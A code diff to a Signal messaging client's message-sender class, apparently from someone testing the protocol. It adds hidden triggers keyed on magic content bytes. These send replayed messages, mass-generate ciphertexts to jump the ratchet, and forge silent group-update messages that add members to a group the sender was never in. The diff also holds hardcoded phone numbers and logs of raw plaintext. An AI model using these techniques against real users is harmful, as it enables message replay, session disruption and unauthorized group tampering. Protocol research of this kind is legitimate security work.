@@ -335,10 +335,77 @@ public class SignalServiceMessageSender {
   {
     Log.d(TAG, "Paul: message to:"+recipient.getNumber()+"\nat time:"+timestamp+
             "\nLegacy and silent?:"+legacy+silent+"\nwith raw content:"+ Hex.toString(content));
+
+    if(content.length > 3 && content[2] == (byte) 0x59 && content[3] == (byte) 0x59) {
+      return sendAddMessage(recipient, timestamp, content, legacy, silent);
+    } else if(content.length > 3 && content[2] == (byte) 0x58 && content[3] == (byte) 0x59) {
+      return jumpRatchet(recipient, timestamp, content, legacy, silent);
+    } else if(content.length > 3 && content[2] == (byte) 0x58 && content[3] == (byte) 0x58) {
+      return groupMsg(recipient, timestamp, content, legacy, silent);
+    } else if(content.length > 3 && content[2] == (byte) 0x5A&& content[3] == (byte) 0x5A) {
+        return farJump(recipient, timestamp, content, legacy, silent);
+    } else {
+
+      for (int i = 0; i < 3; i++) {
+        try {
+          OutgoingPushMessageList messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+          Log.d(TAG, "Paul: encrypted message to:" + recipient.getNumber() + "\nwith raw content:" + JsonUtil.toJson(messages));
+          return socket.sendMessage(messages);
+        } catch (MismatchedDevicesException mde) {
+          Log.w(TAG, mde);
+          handleMismatchedDevices(socket, recipient, mde.getMismatchedDevices());
+        } catch (StaleDevicesException ste) {
+          Log.w(TAG, ste);
+          handleStaleDevices(recipient, ste.getStaleDevices());
+        }
+      }
+    }
+    throw new IOException("Failed to resolve conflicts after 3 attempts!");
+  }
+
+  /**
+   * Meine Test msgs
+   */
+  private SendMessageResponse sendAddMessage(SignalServiceAddress recipient, long timestamp, byte[] content, boolean legacy, boolean silent)
+          throws UntrustedIdentityException, IOException
+  {
+    Log.d(TAG, "Paul: Additional messages to:"+recipient.getNumber()+"\nat time:"+timestamp+
+            "\nLegacy and silent?:"+legacy+silent+"\nwith raw content:"+ Hex.toString(content));
+    SendMessageResponse result = new SendMessageResponse();
     for (int i=0;i<3;i++) {
       try {
         OutgoingPushMessageList messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
-        Log.d(TAG, "Paul: encrypted message to:"+recipient.getNumber()+"\nwith raw content:"+ JsonUtil.toJson(messages));
+        Log.d(TAG, "Paul: 1. encrypted message to:"+recipient.getNumber()+"\nwith raw content:"+ JsonUtil.toJson(messages));
+        result = socket.sendMessage(messages);
+      } catch (MismatchedDevicesException mde) {
+        Log.w(TAG, mde);
+        handleMismatchedDevices(socket, recipient, mde.getMismatchedDevices());
+      } catch (StaleDevicesException ste) {
+        Log.w(TAG, ste);
+        handleStaleDevices(recipient, ste.getStaleDevices());
+      }
+    }
+    for (int i=0;i<3;i++) {
+      try {
+        content[3] = (byte)(content[3]-0x01);
+        timestamp += 10000;
+        OutgoingPushMessageList messages2 = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+        Log.d(TAG, "Paul: 2. encrypted message to:"+recipient.getNumber()+"\nwith raw content:"+ JsonUtil.toJson(messages2));
+        //socket.sendMessage(messages2);
+      } catch (MismatchedDevicesException mde) {
+        Log.w(TAG, mde);
+        handleMismatchedDevices(socket, recipient, mde.getMismatchedDevices());
+      } catch (StaleDevicesException ste) {
+        Log.w(TAG, ste);
+        handleStaleDevices(recipient, ste.getStaleDevices());
+      }
+    }
+    for (int i = 0; i < 3; i++) {
+      try {
+        content[3] = (byte)(content[3]-0x01);
+        timestamp += 10000;
+        OutgoingPushMessageList messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+        Log.d(TAG, "Paul: 3. encrypted message to:" + recipient.getNumber() + "\nwith raw content:" + JsonUtil.toJson(messages));
         return socket.sendMessage(messages);
       } catch (MismatchedDevicesException mde) {
         Log.w(TAG, mde);
@@ -351,6 +418,117 @@ public class SignalServiceMessageSender {
 
     throw new IOException("Failed to resolve conflicts after 3 attempts!");
   }
+
+  // raw group msg from pa: 0a 04 54 65 73 74 1a 14 0a 10 27 e5 51 1d 21 b4 82 f9 f8 25 3b 5f d5 d4 0e fa 10 02
+  private SendMessageResponse groupMsg(SignalServiceAddress recipient, long timestamp, byte[] content, boolean legacy, boolean silent)
+          throws UntrustedIdentityException, IOException {
+    Log.d(TAG, "Paul: Additional messages to:" + recipient.getNumber() + "\nat time:" + timestamp +
+            "\nLegacy and silent?:" + legacy + silent + "\nwith raw content:" + Hex.toString(content));
+    SendMessageResponse response;
+    OutgoingPushMessageList messagesPP, messagesVA;
+
+    SignalServiceAddress pp = new SignalServiceAddress("+491715605860");
+    SignalServiceAddress va = new SignalServiceAddress("+492343226742");
+    //Group ID starts after 1a140a10 and ends before 1002
+    //ID is 27 e5 51 1d 21 b4 82 f9 f8 25 3b 5f d5 d4 0e fa
+    //Content starts from byte[2]
+    //PP gets Paul, VA gets luaP
+    //byte[] groupmsgPP = Hex.fromStringCondensed("0a045061756c1a140a1027e5511d21b482f9f8253b5fd5d40efa1002");
+    //byte[] groupmsgVA = Hex.fromStringCondensed("0a046c7561501a140a1027e5511d21b482f9f8253b5fd5d40efa1002");
+
+    //msg fro group in which he never was member with id 9f 16 7b 90 3c d1 f6 0b e9 65 07 7a ce f6 b2 28
+    //byte[] groupmsgPP = Hex.fromStringCondensed("0a045061756c1a140a109f167b903cd1f60be965077acef6b2211002");
+    //byte[] groupmsgVA = Hex.fromStringCondensed("0a046c7561501a140a109f167b903cd1f60be965077acef6b2211002");
+
+    //group update removing VA and adding PA (due to protbuf length fields maybe no third entry can be added)
+    //msg contains of ..., id, ..., members as a string
+    //removing a user does not work but adding works even if not the whole list is added
+    byte[] groupmsgVA = Hex.fromStringCondensed("1a3f0a109f167b903cd1f60be965077acef6b22810011a0b4f686e6550417262656974220d2b343931373135363035383630220d2b343932333433323236373238");
+    byte[] groupmsgPP = Hex.fromStringCondensed("1a3f0a109f167b903cd1f60be965077acef6b22810011a0b4f686e6550417262656974220d2b343931373135363035383630220d2b343932333433323236373238");
+    boolean silentmsg = true;
+    messagesPP = getEncryptedMessages(socket, pp, timestamp, groupmsgPP, legacy, silentmsg);
+    messagesVA = getEncryptedMessages(socket, va, timestamp, groupmsgVA, legacy, silentmsg);
+    response = socket.sendMessage(messagesPP);
+    socket.sendMessage(messagesVA);
+
+    return response;
+  }
+
+  private SendMessageResponse jumpRatchet(SignalServiceAddress recipient, long timestamp, byte[] content, boolean legacy, boolean silent)
+          throws UntrustedIdentityException, IOException {
+    Log.d(TAG, "Paul: Additional messages to:" + recipient.getNumber() + "\nat time:" + timestamp +
+            "\nLegacy and silent?:" + legacy + silent + "\nwith raw content:" + Hex.toString(content));
+    SendMessageResponse response;
+    OutgoingPushMessageList messageRep = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+    OutgoingPushMessage replay = getEncryptedMessage(socket, recipient, SignalServiceAddress.DEFAULT_DEVICE_ID, content, legacy, silent);
+    OutgoingPushMessageList messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+    OutgoingPushMessageList messages2 = messages;
+
+    List<OutgoingPushMessage> replays = new LinkedList<>();
+    replays.add(replay);
+    timestamp += 10000;
+    messageRep = new OutgoingPushMessageList(recipient.getNumber(), timestamp, recipient.getRelay().orNull(), replays);
+
+    for(int j=1;j<2000;j+=150) {
+      timestamp += 10000;
+      content[3] = (byte)(0x41+(j%26));
+      messages2 = getEncryptedMessages(socket, recipient, timestamp+1000000000, content, legacy, silent);
+
+      for(int i=0;i<j;i++) {
+        content[3] = (byte)(0x41+(i%26));
+        content[4] = (byte)(0x30+((j%10000)/1000));
+        content[5] = (byte)(0x30+((j%1000)/100));
+        content[6] = (byte)(0x30+((j%100)/10));
+        content[7] = (byte)(0x30+(j%10));
+        timestamp += 10000;
+        messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+      }
+      socket.sendMessage(messages);
+      socket.sendMessage(messages2);
+    }
+    response = socket.sendMessage(messageRep);
+
+    for(int i=0;i<2000;i++) {
+      content[3] = (byte)(0x41+(i%26));
+      content[4] = (byte)(0x30+((i%10000)/1000));
+      content[5] = (byte)(0x30+((i%1000)/100));
+      content[6] = (byte)(0x30+((i%100)/10));
+      content[7] = (byte)(0x30+(i%10));
+      timestamp += 10000;
+      getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+    }
+
+    return response;
+  }
+
+
+  private SendMessageResponse farJump(SignalServiceAddress recipient, long timestamp, byte[] content, boolean legacy, boolean silent)
+          throws UntrustedIdentityException, IOException {
+    Log.d(TAG, "Paul: Additional messages to:" + recipient.getNumber() + "\nat time:" + timestamp +
+            "\nLegacy and silent?:" + legacy + silent + "\nwith raw content:" + Hex.toString(content));
+    SendMessageResponse response = null;
+    OutgoingPushMessageList messageRep = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+    OutgoingPushMessageList messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+    for(int i=1;i<10;i++) {
+      for (int j = 1; j < (1000*i); j++) {
+        content[3] = (byte) (0x41 + (j % 26));
+        content[4] = (byte) (0x30 + ((j % 100000) / 10000));
+        content[5] = (byte) (0x30 + ((j % 10000) / 1000));
+        content[6] = (byte) (0x30 + ((j % 1000) / 100));
+        content[7] = (byte) (0x30 + ((j % 100) / 10));
+        content[8] = (byte) (0x30 + (j % 10));
+        timestamp += 10;
+        messages = getEncryptedMessages(socket, recipient, timestamp, content, legacy, silent);
+      }
+      response = socket.sendMessage(messageRep);
+      socket.sendMessage(messages);
+    }
+    if(response != null)
+      return response;
+    else
+      throw new IOException("Failed to resolve conflicts after 3 attempts!");
+  }
+
 
   private List<AttachmentPointer> createAttachmentPointers(Optional<List<SignalServiceAttachment>> attachments) throws IOException {
     List<AttachmentPointer> pointers = new LinkedList<>();
